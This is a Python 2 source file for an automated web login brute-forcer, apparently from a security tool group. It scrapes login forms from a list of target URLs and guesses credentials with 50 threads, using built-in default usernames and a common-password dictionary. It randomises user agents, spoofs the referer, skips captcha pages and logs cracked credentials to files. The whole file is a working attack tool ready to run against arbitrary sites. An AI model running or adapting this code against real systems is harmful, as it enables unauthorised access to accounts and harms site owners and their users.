#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 18/12/28 下午4:58
# @Author  : SecPlus
# @Site    : www.SecPlus.org
# @Email   : TideSecPlus@gmail.com


import urlparse,hackhttp,time,requests,os,sys,re
import random,ssl,socket,urllib,chardet
import threading,datetime,Queue
from bs4 import BeautifulSoup as BS

try:
    import requests
except:
    print 'pip install requests[security]'
    os._exit(0)
try:
    import lxml
except:
    print 'pip install lxml'
    os._exit(0)


reload(sys)
sys.setdefaultencoding( "utf-8" )

# Ignore warning
requests.packages.urllib3.disable_warnings()
# Ignore ssl warning info.
try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    # Legacy Python that doesn't verify HTTPS certificates by default
    pass
else:
    # Handle target environment that doesn't support HTTPS verification
    ssl._create_default_https_context = _create_unverified_https_context

lock = threading.Lock()

def requests_proxies():
    '''
    Proxies for every requests
    '''
    proxies = {
    #'http':'',#127.0.0.1:1080 shadowsocks
    #'http':'127.0.0.1:8081',
    #'https':'127.0.0.1:8081'#127.0.0.1:8080 BurpSuite
    }
    return proxies
def requests_headers():
    '''
    Random UA  for every requests && Use cookie to scan
    '''
    user_agent = ['Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.1) Gecko/20061010 Firefox/2.0',
    'Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.6 Safari/532.0',
    'Mozilla/5.0 (Windows; U; Windows NT 5.1 ; x64; en-US; rv:1.9.1b2pre) Gecko/20081026 Firefox/3.1b2pre',
    'Opera/10.60 (Windows NT 5.1; U; zh-cn) Presto/2.6.30 Version/10.60','Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4062; en; U; ssr)',
    'Mozilla/5.0 (Windows; U; Windows NT 5.1; ; rv:1.9.0.14) Gecko/2009082707 Firefox/3.0.14',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
    'Mozilla/5.0 (Windows; U; Windows NT 6.0; fr; rv:1.9.2.4) Gecko/20100523 Firefox/3.6.4 ( .NET CLR 3.5.30729)',
    'Mozilla/5.0 (Windows; U; Windows NT 6.0; fr-FR) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
    'Mozilla/5.0 (Windows; U; Windows NT 6.0; fr-FR) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5']
    UA = random.choice(user_agent)
    headers = {
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.6 Safari/532.0',
    'Upgrade-Insecure-Requests':'1','Connection':'keep-alive','Cache-Control':'max-age=0',
    'Accept-Encoding':'gzip, deflate, sdch','Accept-Language':'zh-CN,zh;q=0.8',
    "Referer": "http://www.baidu.com/link?url=www.so.com&url=www.soso.com&&url=www.sogou.com",
    'Content-Type': 'application/x-www-form-urlencoded'}
    return headers


class Worker(threading.Thread):  # 处理工作请求
    def __init__(self, workQueue, resultQueue, **kwds):
        threading.Thread.__init__(self, **kwds)
        self.setDaemon(True)
        self.workQueue = workQueue
        self.resultQueue = resultQueue

    def run(self):
        while 1:
            try:
                callable, args, kwds = self.workQueue.get(False)  # get task
                res = callable(*args, **kwds)
                self.resultQueue.put(res)  # put result
            except Queue.Empty:
                break

class WorkManager:  # 线程池管理,创建
    def __init__(self, num_of_workers=10):
        self.workQueue = Queue.Queue()  # 请求队列
        self.resultQueue = Queue.Queue()  # 输出结果的队列
        self.workers = []
        self._recruitThreads(num_of_workers)

    def _recruitThreads(self, num_of_workers):
        for i in range(num_of_workers):
            worker = Worker(self.workQueue, self.resultQueue)  # 创建工作线程
            self.workers.append(worker)  # 加入到线程队列

    def start(self):
        for w in self.workers:
            w.start()

    def wait_for_complete(self):
        while len(self.workers):
            worker = self.workers.pop()  # 从池中取出一个线程处理请求
            worker.join()
            if worker.isAlive() and not self.workQueue.empty():
                self.workers.append(worker)  # 重新加入线程池中

    def add_job(self, callable, *args, **kwds):
        self.workQueue.put((callable, args, kwds))  # 向工作队列中加入请求

    def get_result(self, *args, **kwds):
        return self.resultQueue.get(*args, **kwds)


def getCoding(strInput):
    '''
    获取编码格式
    '''
    if isinstance(strInput, unicode):
        return "unicode"
    try:
        strInput.decode("utf8")
        return 'utf8'
    except:
        pass
    try:
        strInput.decode("gbk")
        return 'gbk'
    except:
        pass


def tran2UTF8(strInput):
    '''
    转化为utf8格式
    '''
    try:
        strCodingFmt = getCoding(strInput)
        if strCodingFmt == "utf8":
            return strInput
        elif strCodingFmt == "unicode":
            return strInput.encode("utf8")
        elif strCodingFmt == "gbk":
            return strInput.decode("gbk").encode("utf8")
    except:
        return strInput


def url2ip(url):
    '''
    Url to ip
    '''
    ip = ''
    try:
        url = url.strip()
        if not url.startswith("http"):
            url = "http://" + url
        handel_url = urlparse.urlparse(url).hostname
        ip = socket.gethostbyname(handel_url)
    except:
        print '[!] Can not get ip'
        pass
    return ip


def get_header(url):

    try:
        print "Get http header:",url
        if not url.startswith("http"):
            url = "http://" + url
        hh = hackhttp.hackhttp()
        code, head, body, redirect, log = hh.http(url, headers=requests_headers())
        print "Get header ok:", url
        if log:
            return log['response'].decode('utf-8', 'ignore').encode('utf-8')
        else:
            return False
    except:
        return False



def get_form_title(url):
    url1 = url.strip()
    header = {"Accept": "text/html,application/xhtml+xml,application/xml;",
               "Accept-Encoding": "gzip",
               "Accept-Language": "zh-CN,zh;q=0.8",
               "Referer": "http://www.baidu.com/link?url=www.so.com&url=www.soso.com&&url=www.sogou.com",
               "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
               }
    html = requests.get(url1, timeout=10, verify=False,headers=header).content

    if re.search('gb2312', html):
        html = html.decode('gbk', 'replace').encode('utf-8')
    html =tran2UTF8(html)
    # print html
    all_soup = BS(html, "lxml")
    yzms = ['验证码','点击更换','点击刷新']
    for yzm in yzms:
        if yzm in str(html):
            print "\n\033[1;31m[ ",yzm,"in source:",url,']\033[0m\n'
            lock.acquire()
            log.write("??? "+yzm+" in source: "+url+'\n')
            lock.release()
            return '',''
    try:
        title = all_soup.title.text
        title = tran2UTF8(title)
    except:
        title = ''
    # print title

    result = re.findall(".*<form (.*)</form>.*", str(html),re.S)
    form_data = ''
    form_content =''
    if result:
        form_data = '<form '+result[0] + ' </form>'
        # print form_data
        form_soup = BS(form_data, "lxml")
        # print form_soup
        form_content = form_soup.form
        # print type(form_content)
    # print form_content
    return form_content,title


def get_data(url,content):
    # print content
    data = {}
    yzm = 0
    # print content
    for x in  content.find_all('input'):
        # print x
        if x.has_attr('name'):
            canshu = x['name']
        elif x.has_attr('id'):
            canshu = x['id']
        # elif x.has_attr('type'):
        #     canshu = x['type']
        # elif x.has_attr('class'):
        #     canshu = x['class']
        else:
            canshu = ''

        if x.has_attr('value'):
            value = x ['value']
        else:
            value ='0000'
        if canshu:
            for z in ['zhanghao','yonghu','user','name','email','account']:
                if z in canshu.lower():
                    value = '{user_name}'

            for y in ['pass','pwd','mima']:
                if y in canshu.lower():
                    value = '{pass_word}'

            for a in ['checkcode','valicode','code']:
                if canshu.lower() in a:
                    print canshu
                    yzm = 1

            for b in ['pma_username','pma_password']:
                if canshu.lower() == b:
                    print "\n\033[1;31m[ phpmyadmin possible:",url,']\033[0m\n'
                    lock.acquire()
                    log.write("??? phpmyadmin possible::"+url+'\n')
                    lock.release()
                    return ""
            data[canshu]=str(value)

    if yzm:
        print "\n\033[1;31m[ Maybe yzm in url:",url,']\033[0m\n'
        lock.acquire()
        log.write("??? Maybe yzm in url:"+url+'\n')
        lock.release()
        return ""
    else:
        return urllib.urlencode(data)

def get_post_get_page(content):
    form_action = str(content).split('\n')[0]
    # print form_action
    soup = BS(form_action, "lxml")
    url_path = ''
    for x in re.findall(".*?/",url):
        url_path =  url_path+x

    action_url = soup.form['action']
    if str(action_url).startswith('http'):
        path = action_url
    else:
        path = url_path+soup.form['action']
    method = soup.form['method']
    return path,method
        # print x
    # print  content[]


def get_error_length(conn,method,path,data):

    data1 = data
    # print data1
    cookie_error_flag = 0
    data2 = str(data1.replace('%7Buser_name%7D', 'admin'))
    data2 = str(data2.replace('%7Bpass_word%7D', 'length_test'))
    if method.lower() == 'get':
        # path = path+'?'+data2
        # print path
        res = conn.get(path, headers=requests_headers(), allow_redirects=False,timeout=10)
        error_length = len(res.content+str(res.headers))
        if 'Set-Cookie' in res.headers:
            cookie_error_flag = 1
        return error_length,cookie_error_flag
    if method.lower() == 'post':
        # print path
        res = conn.post(url = path,data = data2, headers=requests_headers(), timeout=10,verify=False,allow_redirects=False,proxies = requests_proxies())
        error_length = len(res.content+str(res.headers))
        if 'Set-Cookie' in res.headers:
            cookie_error_flag = 1
        return error_length,cookie_error_flag


def web_crack(method,path,data):
    # try:
    conn =  requests.session()
    res0 = conn.get(path, headers=requests_headers(), allow_redirects=False,timeout=10,proxies = requests_proxies())
    error_length,cookie_error_flag = get_error_length(conn,method,path,data)

    num = 0
    success_flag = 0
    dic_all = len(USERNAME_DIC)*len(PASSWORD_DIC)
    for user_name in USERNAME_DIC:
        for pass_word in PASSWORD_DIC:
            data1 = data
            # print data1
            user_name = user_name.strip()
            pass_word = pass_word.strip()
            pass_word = str(pass_word.replace('{user}', user_name))
            data2 = str(data1.replace('%7Buser_name%7D', user_name))
            data2 = str(data2.replace('%7Bpass_word%7D', pass_word))

            num = num+1
            # print "字典总数：",dic_all," 当前尝试：",num," checking:",user_name,pass_word
            # print "url:",path,"  data:",urllib.unquote(data2)

            if method.lower() == 'get':
                # path = path+'?'+data2
                # print path
                res = conn.get(path, headers=requests_headers(), allow_redirects=False,timeout=10)
                cur_length = len(res.content+str(res.headers))
                # print "Get  error_length:",error_length, " cur_length:",cur_length," cookie_error_flag:",cookie_error_flag
                if cookie_error_flag:  # cookie_error_flag表示每个数据包中都有cookie
                    if cur_length!=error_length:
                        success_flag =1
                        return user_name,pass_word
                elif 'Set-Cookie' in res.headers and cur_length!=error_length:
                    # print  "ok"
                    success_flag =1

                    return user_name,pass_word

            if method.lower() == 'post':
                # print path
                res = conn.post(url = path,data = data2, headers=requests_headers(), timeout=10,verify=False,allow_redirects=False,proxies = requests_proxies())
                cur_length = len(res.content+str(res.headers))
                # print "Post  error_length:",error_length, " cur_length:",cur_length," cookie_error_flag:",cookie_error_flag
                # print res.status_code
                # print res.headers
                if cookie_error_flag:  # cookie_error_flag表示每个数据包中都有cookie
                    if cur_length!=error_length:
                        success_flag =1
                        return user_name,pass_word
                elif 'Set-Cookie' in res.headers and cur_length!=error_length:
                    # print  "ok"
                    success_flag =1
                    return user_name,pass_word
    if success_flag == 0:
        return False,False

def web_crack_task(url,num):
    try:
        # global num
        url = url.strip()
        form_content,title = get_form_title(url)
        # print form_content
        if form_content:
            data = get_data(url,form_content)
            # print data
            if data:
                print "Checking :",url," All_num:",url_all,"Current_num:",num," ",time.strftime('%Y-%m-%d %X', time.localtime(time.time()))
                path,method = get_post_get_page(form_content)
                user_name,pass_word = web_crack(method,path,data)
                if user_name or pass_word:
                    lock.acquire()
                    log.write("!!! Success url:"+url+'\t'+user_name+'/'+pass_word+'\n')
                    oklog.write("!!! Success url:"+url+'\t'+user_name+'/'+pass_word+'\n')
                    lock.release()
                    print "\n\033[1;32m[ Success url:",url," user/pass",user_name,pass_word,']\033[0m\n'
                else:
                    print "\n\033[1;31m[ Faild url:",url,']\033[0m\n'
    except Exception as e:
        start = datetime.datetime.now()
        error_log.write(str(start)+str(e)+'\n')
        print start,e


USERNAME_DIC = ['admin','guest','test','system','ceshi']
PASSWORD_DIC = ['123456','admin','password','123123','123','1','{user}','{user}{user}','{user}1','{user}123','{user}2018','{user}2017','{user}2016','{user}2015','{user}!','','P@ssw0rd!!','qwa123','12345678','test','123qwe!@#','123456789','123321','1314520','666666','woaini','000000','1234567890','8888888','qwerty','1qaz2wsx','abc123','abc123456','1q2w3e4r','123qwe','a123456','p@ssw0rd','a123456789','woaini1314','qwerasdf','123456a','123456789a','987654321','qwer!@#$','5201314520', 'q123456', '123456abc', '123123123', '123456.','0123456789', 'asd123456', 'aa123456', 'q123456789', '!QAZ@WSX','12345','1234567','passw0rd','admin888']

# USERNAME_DIC = ['admin']
# PASSWORD_DIC = ['123456','admin','111111']

log = open('web_crack_log.txt','a+')

oklog = open('web_crack_ok.txt','a+')

error_log = open('web_crack_error.txt','a+')


if __name__ == "__main__":
    now = time.strftime('%Y-%m-%d %X', time.localtime(time.time()))
    try:
        urllist = []
        url_file = open('result_url_01.txt','r')
        for u in url_file.readlines():
            u = u.strip()
            urllist.append(u)
        url_all = len(urllist)
        cur_num = 0
        print url_all
        times_num = 1

        while (50*times_num < url_all):
            wm = WorkManager(50)
            for num in range(50*(times_num-1),50*times_num):
                print "url_all:",url_all," current_num:",num," current_url:",urllist[num]
                url =urllist[num].strip()
                wm.add_job(web_crack_task, url,num)
            wm.start()
            wm.wait_for_complete()

            times_num = times_num+1
    except Exception as e:
        start = datetime.datetime.now()
        error_log.write(str(start)+str(e)+'\n')
        print start,e


    # except  Exception, e:
    #     info = '\033[1;35m[!]%s\n Main_function Error: %s\033[0m!' % (now, e)
    #     print info
